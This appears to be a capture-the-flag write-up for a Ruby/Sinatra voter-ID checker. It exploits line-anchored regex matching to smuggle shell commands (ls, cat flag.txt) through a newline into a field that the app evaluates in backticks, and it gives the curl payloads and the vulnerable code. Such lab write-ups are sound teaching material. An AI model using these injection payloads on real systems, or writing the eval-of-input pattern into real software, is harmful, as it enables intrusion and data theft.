# Verificiation or Execution - web

## Challenge

Look, this is supposed to be a simple checker for an ID to make sure its actually part of the early voting system, yet someone gained access to my system?!

There's only one field and I'm sure my regex is perfect!

## Solve

For this challenge, we are presented with a simple web application with a single text box where we can enter a `voter ID`: 

vveve

If we send a POST request without the `voter_id` parameter set, we can throw an error and hit the debug page:

ve.png

We can see the source code logic behind the application, and note that the webapp is built with Ruby using the Sinatra framework:

```ruby
    get '/' do
      erb :index
    end

    post '/' do
      voter_id = params[:voter_id]

      if !voter_id.match(/^[A-Za-z]{4}\d{4}$/)

        result = "Error: Invalid voter ID format. Expected 4 letters followed by 4 digits. Debug: did not pass /^[A-Za-z]{4}\\d{4}$/"
      else
        begin
          result = eval("`./votercheck.sh #{voter_id}`")
        rescue => e
          result = "Error: #{e.message}"
        end
```

The regex constrains us to strictly 4 letters followed by 4 numbers. However, this [article](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-41) explained Ruby's weird regex behaviour which alllows us to get the flag:

> "The key vulnerability is that the match method in Ruby will return a match if any line in a multiline string matches the pattern."

So, if we send a multiline string where one of the lines matches the regex, and the other contains malicious input our input will be processed in `eval()`:

- First checked file structure with:

```bash 
curl -X POST http://3.105.27.130:8002/ -d $'voter_id; ls;\nABCD1234'
```

ve1

- And then read the flag with:

```bash
curl -X POST http://3.105.27.130:8002/ -d $'voter_id; cat flag.txt;\nABCD1234'
```

ve2

`secedu{h0_b0y_th3y'r3_in_we'3r_in_tr0ubl3_ar3n't_w3}`
